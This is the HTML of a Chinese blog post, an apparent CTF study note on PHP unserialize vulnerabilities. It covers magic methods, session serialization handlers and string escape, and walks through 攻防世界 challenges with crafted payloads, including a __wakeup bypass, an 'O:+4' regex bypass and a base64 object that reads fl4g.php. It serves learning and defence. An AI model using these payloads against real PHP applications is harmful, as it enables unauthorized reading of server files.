@@ -1,0 +1,1824 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="keywords" content="PHP反序列化漏洞学习, Ab4nd0n">
+    <meta name="description" content="记录学习，记录生活。">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>PHP反序列化漏洞学习 | Ab4nd0n</title>
+    <link rel="icon" type="image/jpeg" href="/medias/touxiang.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    <link rel="stylesheet" href="/js/prism/prism.css">
+
+
+    <script src="https://v1.hitokoto.cn/?c=d&encode=js&select=%23hitokoto" defer></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Ab4nd0n" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/touxiang.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Ab4nd0n</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/touxiang.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Ab4nd0n</div>
+        <div class="logo-desc">
+            
+            记录学习，记录生活。
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+    
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/30.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">PHP反序列化漏洞学习</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+   /* .toc-widget {
+        width: 300px;
+        padding-left: 20px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    } */
+    .toc-widget {
+        width: 300px;
+        padding-left: 20px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Web/">
+                                <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">PHP反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-10-28
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-11-23
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    13 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>首先，什么是序列化？</p>
+<p><strong>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。</strong><br><strong>反序列化则相反将字符串重新恢复成对象</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>过程</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>序列化</td>
+<td>对象—&gt; 字符串</td>
+</tr>
+<tr>
+<td>反序列化</td>
+<td>字符串—&gt;对象</td>
+</tr>
+</tbody></table>
+<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/1893076-20200711232303502-1979730084.png" alt="1893076-20200711232303502-1979730084.png" style="zoom:60%;">
+
+<h5 id="1-序列化函数serialize"><a href="#1-序列化函数serialize" class="headerlink" title="1.序列化函数serialize()"></a>1.序列化函数serialize()</h5><pre><code class="line-numbers language-php">&lt;?php
+    class Ctf{
+        public $flag='flag{****}';
+        public $name='cxk';
+        public $age='10';
+    }
+    $ctfer=new Ctf();     //实例化一个对象
+    $ctfer-&gt;flag='flag{adedyui}';
+    $ctfer-&gt;name='Sch0lar';
+    $ctfer-&gt;age='18'
+    echo serialize($ctfer);  //将其序列化
+?&gt;
+</code></pre>
+<blockquote>
+<p>输出结果 O:3:”Ctf”:3{s:4:”flag”;s:13:”flag{abedyui}”;s:4:”name”;s:7:”Sch0lar”;s:3:”age”;s:2:”18”;} </p>
+<p>O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示 </p>
+<p>3代表类的名字长三个字符 </p>
+<p>Ctf 是类名 </p>
+<p>3代表这个类里有三个属性(三个变量)</p>
+<p>s代表字符串 </p>
+<p>4代表属性名的长度</p>
+<p>flag是属性名 s:13:”flag{adedyui}” 字符串，属性长度，属性值</p>
+</blockquote>
+<p>注：serialize()函数在执行前会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，**<code>__sleep()</code>方法会先被调用，然后才执行序列化操作**。</p>
+<p><strong>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</strong></p>
+<p>exp :</p>
+<pre><code class="line-numbers language-php">&lt;?php
+    class Ctf{
+        public $flag='flag{****}';
+        public $name='cxk';
+        public $age='10';
+        public function __sleep(){
+            return array('flag','age');
+        }
+    }
+    $ctfer=new Ctf();
+    $ctfer-&gt;flag='flag{abedyui}';
+    $ctfer-&gt;name='Sch0lar';
+    $ctfer-&gt;age='18'
+    echo serialize($ctfer);
+?&gt;
+</code></pre>
+<p>运行结果：<strong>O:3:”Ctf”:2:{s:4:”flag”;s:13:”flag{abedyui}”;s:3:”age”;s:2:”18”;}</strong></p>
+<p>（注意一下，这边对php的版本有要求，此处我用的是php 5.2.17nts）</p>
+<h5 id="2-反序列化函数-unserialize"><a href="#2-反序列化函数-unserialize" class="headerlink" title="2.反序列化函数 unserialize()"></a>2.反序列化函数 unserialize()</h5><pre><code class="line-numbers language-php">&lt;?php
+    class Ctf{
+        public $flag='flag{****}';
+        public $name='cxk';
+        public $age='10';
+        
+    }
+    $ctfer=new Ctf();
+    $ctfer-&gt;flag='flag{abedyui}';
+    $ctfer-&gt;name='Sch0lar';
+    $ctfer-&gt;age='18';
+    $a = serialize($ctfer);    //O:3:"Ctf":2:{s:4:"flag";s:13:"flag{abedyui}";s:3:"age";s:2:"18";}
+    var_dump(unserialize($a));  //输出反序列化的结果
+?&gt;
+</code></pre>
+<p>运行结果：<strong>D:\phpstudy_pro\WWW\sleep.php:13: class Ctf#2 (3) { public $flag =&gt; string(13) “flag{abedyui}” public $name =&gt; string(7) “Sch0lar” public $age =&gt; string(2) “18” }</strong></p>
+<pre><code>D:\phpstudy_pro\WWW\sleep.php:13:
+class Ctf#2 (3) {
+  public $flag =&gt;
+  string(13) "flag{abedyui}"
+  public $name =&gt;
+  string(7) "Sch0lar"
+  public $age =&gt;
+  string(2) "18"
+}
+</code></pre>
+<p>注：unserialize() 执行时会检查是否存在一个 wakeup() 方法。 如果存在，则会先调用 wakeup方法。而涉及到__wakeup()函数，经常要用到的就是<strong>当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过wakeup()函数的执行。</strong></p>
+<blockquote>
+<p>__sleep()函数是在serialize(序函数列化一个对象前被调用，用来指定要序列化的属性</p>
+<p>__wakeup()函数则是在unserialize()反序列化一个字符串前被调用</p>
+</blockquote>
+<p>关于__wakeup()的实例：</p>
+<h6 id="1-攻防世界-web高手进阶区-unserialize3-wakeup-魔术方法"><a href="#1-攻防世界-web高手进阶区-unserialize3-wakeup-魔术方法" class="headerlink" title="1.攻防世界 web高手进阶区 unserialize3 (__wakeup()魔术方法)"></a>1.攻防世界 web高手进阶区 unserialize3 (<strong>__wakeup()魔术方法</strong>)</h6><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LTtiandd/article/details/99591998">攻防世界unserialize3题解</a></p>
+<blockquote>
+<p>__wakeup() 将在被序列化后立即被调用 </p>
+<p><strong>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，会导致反序列化失败同时不会执行__wakeup()函数</strong></p>
+</blockquote>
+<pre><code class="line-numbers language-php">&lt;?php
+class Ab4ndon{
+        var $test = '123';
+}
+
+$a = new Ab4ndon();    //这里就是创建了一个新的对象
+
+$a_ser = serialize($a);   //将这个对象进行字符串封装，就是对其进行序列化
+
+//print_r($a_ser);
+$a_unser = unserialize($a_ser);//进行反序列化
+
+print_r($a_unser);
+?&gt;
+</code></pre>
+<p>代码：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+class xctf{
+    public $flag = '111';
+    public function __wakeup(){
+    exit('bad requests');
+    }
+}//这边注意一下方括号要对应，一开始少了这个方括号一直报错
+    $a = new xctf();
+    $a_ser = serialize($a);   //将这个对象进行字符串封装，就是对其进行序列化
+
+print_r($a_ser);  //输出序列化后的内容
+?&gt;
+</code></pre>
+<p>序列化结果：</p>
+<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
+<p>利用__wakeup()的漏洞，构造payload为：**?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}**</p>
+<h5 id="3-访问控制修饰符"><a href="#3-访问控制修饰符" class="headerlink" title="3.访问控制修饰符"></a>3.访问控制修饰符</h5><pre><code>public(公有) 
+protected(受保护)     // %00*%00属性名
+private(私有的)       // %00类名%00属性名
+</code></pre>
+<p>在本地写个php测试一下:</p>
+<pre><code class="line-numbers language-php">&lt;?php
+    class Ctf{
+        public $name='Ab4ndon';
+        protected $age='20';
+        private $flag='fl4g';
+    }
+    $ctfer=new Ctf();     //实例化一个对象
+    echo serialize($ctfer);
+?&gt;
+</code></pre>
+<p>输出结果：*<em>O:3:”Ctf”:3:{s:4:”name”;s:7:”Ab4ndon”;s:6:”<em>age”;s:2:”20”;s:9:”Ctfflag”;s:4:”fl4g”;}</em></em></p>
+<blockquote>
+<p>可以看到，protected 属性被序列化后age属性名的长度变成了6,为什么呢？因为age前还有**%00*%00**</p>
+<p>同样地，private 属性被序列化后flag属性名的长度也不是flag的原长，因为flag前面还有**%00Ctf%00**</p>
+</blockquote>
+<p>下面介绍一个考察__wakeup()和访问控制修饰符的题：</p>
+<h6 id="1-攻防世界-web高手进阶区-Web-php-unserialize"><a href="#1-攻防世界-web高手进阶区-Web-php-unserialize" class="headerlink" title="1.攻防世界 web高手进阶区 Web_php_unserialize"></a>1.攻防世界 web高手进阶区 Web_php_unserialize</h6><p>源码：</p>
+<pre><code class="line-numbers language-php">&lt;?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) {     //执行 __construct 方法，将传入的 $file 赋值给本地的私有方法 $file
+        $this-&gt;file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this-&gt;file, true);   //销毁时执行 __destruct 方法，高亮本地变量 file 文件的代码
+    }
+    function __wakeup() { 
+        if ($this-&gt;file != 'index.php') {        //当反序列化构造这个类时执行 __wakeup 方法，会将本地变量 file                                                     重新设置为 index.php
+            //the secret is in the fl4g.php
+            $this-&gt;file = 'index.php'; 
+        } 
+    } 
+}
+if (isset($_GET['var'])) { 
+    $var = base64_decode($_GET['var']);         //base64编码传入的var参数
+    if (preg_match('/[oc]:\d+:/i', $var)) {     //正则匹配 o:数字：或者 c:数字：，不区分大小写
+        die('stop hacking!'); 
+    } else {
+        @unserialize($var);                     //反序列化
+    } 
+} else { 
+    highlight_file("index.php"); 
+} 
+?&gt;
+</code></pre>
+<p>思路大致为：</p>
+<p>构造Demo类，传入$file=fl4g.php(传入的$file赋值给本地私有方法$file，然后__destruct()函数在对象销毁时执行，高亮本地变量file的代码，故我们将file赋值为我们想看的fl4g.php),然后将其序列化</p>
+<pre><code class="line-numbers language-php">&lt;?php 
+class Demo { 
+    private $file = 'fl4g.php';
+}
+
+$a =new Demo($file);
+echo serialize($a);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
+
+</code></pre>
+<p>将序列化结果中的属性个数改为2（绕过__wakeup()函数的执行），将o:4改为o:+4或者o:@4(绕过正则匹配)，Base64编码后get传参</p>
+<p>但是这样操作得不到flag，问题出在哪？</p>
+<p>$file是私有方法 private,前面提到private属性被序列化后属性名的形式为**%00类名%00属性名**,我们看到file本该是4个字符，序列化后确实10个字符。我尝试在Demo前后加%00再编码，失败，后来看别人的wp，才找到原因，<strong>因为复制粘贴时破坏了 “ %00 “ 这个特殊字符。 将序列化后的字符串直接存入文件不会破坏这个 “ %00 “ 特殊字符。</strong></p>
+<pre><code class="line-numbers language-php">&lt;?php 
+class Demo { 
+    private $file = 'fl4g.php';
+}
+
+$c =new Demo($file);
+$a=serialize($c);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
+
+$a = str_replace(':1:', ':2:', $a);        //绕过wakeup
+$a = str_replace('O:4', 'O:+4', $a);        //绕过正则匹配
+print_r($a);
+print_r("&lt;br&gt;");
+var_dump(base64_encode($a));        //base64编码
+//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}&lt;br&gt;D:\phpstudy_pro\WWW\sleep.php:13:
+//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
+</code></pre>
+<p>所以构造payload:<strong>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</strong></p>
+<blockquote>
+<p>注意学习这种直接写php去得到payload的方法，尤其是碰到private和protected时</p>
+<p>此处再贴一篇wp:<a target="_blank" rel="noopener" href="https://moreant.github.io/post/60542.html">攻防世界 WEB Web_php_unserialize</a></p>
+</blockquote>
+<h5 id="4-魔术方法"><a href="#4-魔术方法" class="headerlink" title="4.魔术方法"></a>4.魔术方法</h5><p><strong>php反序列化漏洞触发条件：</strong> unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</p>
+<p>接下来介绍一些常见的魔术方法（wakeup()和sleep()函数在前面已经介绍过了，就不再详述）</p>
+<pre><code>__construct() 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。
+
+__destruct() 当一个对象销毁（反序列化）时被调用
+
+__toString() 当一个对象被当作一个字符串使用时被调用
+
+__sleep() 在对象在被序列化之前立即运行
+
+__wakeup() 将在序列化之后立即被调用
+</code></pre>
+<h6 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h6><pre><code class="line-numbers language-php">&lt;?php
+class xctf{
+    public $flag = '111';
+    function __construct() {
+        echo ("Ab4ndon!");
+    }
+}
+    
+    $a = new xctf();
+    
+?&gt;
+</code></pre>
+<p>运行结果：<strong>Ab4ndon!</strong></p>
+<p>可以很清楚地看出来construct()魔术方法在创建对象时进行了调用</p>
+<h6 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h6><pre><code class="line-numbers language-php">&lt;?php
+class Example {
+    var $var = '';
+    function __destruct() {
+        highlight_file($this-&gt;var);  //常用文件读取函数：readfile（需要去源码里看） highlight_file                                                                       show_source            file_get_contents（不会输出）
+    }
+}
+unserialize($_GET['a']);
+/*$obj = new Example();            //实例化一个对象，并将其序列化：O:7:"Example":1:{s:3:"var";s:8:"flag.php";}
+$obj-&gt;var='flag.php';
+var_dump(serialize($obj));
+*/
+?&gt;　
+    
+    
+  //flag.php
+    &lt;?php
+$flag="flag!!!!!";
+</code></pre>
+<p>payload如下：<code>?a=O:7:"Example":1:{s:3:"var";s:8:"flag.php";}</code></p>
+<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011115348580.png" alt="image-20201011115348580" style="zoom:67%;">
+
+<h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><h5 id="5-session反序列化"><a href="#5-session反序列化" class="headerlink" title="5.session反序列化"></a>5.session反序列化</h5><p>在php.ini中存在三项配置项：</p>
+<ul>
+<li><code>session.save_path=""</code> –设置session的存储路径</li>
+<li><code>session.save_handler=""</code> –<strong>设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</strong></li>
+<li><code>session.auto_start boolen</code> –指定会话模块是否在请求开始时启动一个会话，默认为0不启动</li>
+<li><code>session.serialize_handler string</code> –<strong>定义用来序列化/反序列化的处理器名字。默认使用php (php&lt;5.5.4)</strong></li>
+</ul>
+<p><strong>在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</strong></p>
+<table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>session存储方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php(php&lt;5.5.4)</td>
+<td>存储方式是，键名+竖线`</td>
+</tr>
+<tr>
+<td>php_serialize(php&gt;5.5.4)</td>
+<td>存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化）</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
+</tr>
+</tbody></table>
+<p>在PHP (php&lt;5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set('session.serialize_handler', '需要设置的引擎名');</code>进行设置。</p>
+<p>示例代码如下：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');   //设置序列化引擎使用php_serialize
+session_start();
+// do something
+......
+</code></pre>
+<p><strong>由于序列化和反序列化所使用的序列化引擎不一样就是造成PHP Session序列化漏洞的原因</strong></p>
+<p>（此处使用的是php7.3.4nts）</p>
+<ul>
+<li>php引擎</li>
+</ul>
+<pre><code class="line-numbers language-php">&lt;?php
+ini_set('session.serialize_handler', 'php');
+session_start();      // session_start()会创建新会话或者重用现有会话
+$_SESSION['name'] = 'Ab4ndon';
+var_dump();
+?&gt;
+</code></pre>
+<p>去本地文件夹下找到存储session文件的地方，如我的：D:\phpstudy_pro\Extensions\tmp\tmp，发现一个sess开头的文件，sess_后面是PHPSESSID的值</p>
+<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011105453092.png" alt="image-20201011105453092" style="zoom:50%;">
+
+<p>打开，内容为：<strong>name|s:7:”Ab4ndon”;</strong>     <strong>键名+竖线<code>|</code>+经过serialize()函数序列处理的值（只序列化值</strong>）</p>
+<ul>
+<li>php_serialize引擎</li>
+</ul>
+<pre><code class="line-numbers language-php">&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();      // session_start()会创建新会话或者重用现有会话
+$_SESSION['name'] = 'Ab4ndon';
+var_dump();
+?&gt;
+</code></pre>
+<p>文件内容：<strong>a:1:{s:4:”name”;s:7:”Ab4ndon”;}</strong>    <strong>a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key(键)和value(值)都会进行序列化</strong>。</p>
+<ul>
+<li>php_binary</li>
+</ul>
+<pre><code class="line-numbers language-php">&lt;?php
+ini_set('session.serialize_handler', 'php_binary');
+session_start();      // session_start()会创建新会话或者重用现有会话
+$_SESSION['name'] = 'Ab4ndon';
+var_dump();
+?&gt;
+</code></pre>
+<p>文件内容：<strong>names:7:”Ab4ndon”;</strong>      键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值.由于name的长度是4，4在ASCII表中对应的就是。根据php_binary的存储规则，最后就是<code>names:7:"Ab4ndon";</code> </p>
+<h5 id="6-字符串逃逸"><a href="#6-字符串逃逸" class="headerlink" title="6.字符串逃逸"></a>6.字符串逃逸</h5><img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/YqFpH1.png" alt="1" style="zoom:67%;">
+
+<p>首先我们需要知道，在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。而且最后变量闭合都需要双引号以及结束的花括号，举个例子：</p>
+<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
+<p>和</p>
+<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx</code>(xxx是任意的一串字符)</p>
+<p>反序列化后的结果是一样的，也就是说，php在反序列化的时候是严格地按照一定的格式去进行的。</p>
+<p>如果指定的长度错误则反序列化就会失败。</p>
+<p>测试如下：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+class xctf{
+    public $flag = '111';
+}
+    
+    $a = new xctf();
+    $a_ser = serialize($a);   //O:4:"xctf":1:{s:4:"flag";s:3:"111";}
+
+//print_r($a_ser);
+$res=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}');
+$res2=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx');
+$res3=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"11";}');
+print_r($res);
+print_r($res2);
+print_r($res3);
+
+?&gt;
+</code></pre>
+<pre><code>//输出结果
+xctf Object          //$res
+(
+    [flag] =&gt; 111
+)
+xctf Object            //$res2
+(
+    [flag] =&gt; 111
+)
+</code></pre>
+<p>如果我们将111改为11，就会反序列化失败，我的vscode没有任何输出。</p>
+<p>为什么呢？因为此时的flag所读取的数据为11“而<strong>正常的语法是需要用”;去闭合当前的变量，而因为长度错误所以此时php把闭合的双引号当做了字符串，所以下一个字符就成了分号，没能闭合导致抛出了错误。</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sumarua/p/12932401.html"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sumarua/p/12932401.html">PHP反序列化字符逃逸详解</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-there/p/12870541.html">浅谈PHP字符串逃逸</a></p>
+<p>知识补充<br>unserialize漏洞依赖几个条件：</p>
+<p>unserialize函数的参数可控<br>脚本中存在一个构造函数（__construct()）、析构函数（__destruct()）、__wakeup()函数中有向php文件中写数据的操作的类<br>所写的内容需要有对象中的成员变量的值<br>防范的方法有：</p>
+<ol start="4">
+<li>严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则</li>
+<li>对于unserialize后的变量内容进行检查，以确定内容没有被污染</li>
